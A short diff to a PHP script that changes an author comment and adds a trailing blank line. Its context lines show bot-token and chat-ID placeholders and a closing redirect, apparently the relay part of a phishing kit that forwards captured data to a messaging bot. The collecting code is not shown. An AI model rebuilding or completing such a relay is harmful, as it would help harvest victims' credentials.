@@ -1,5 +1,5 @@
 <?php
-// dev Frenzyyy
+// dev Frenzyyy12
 $bot_token = 'BOT_TOKEN';
 $chat_id = 'CHAT_ID';
 $redirect_url = 'https://your.site/web/index.html';
@@ -89,3 +89,4 @@ $context = stream_context_create($options);
 
 header("Location: $redirect_url");
 exit;
+
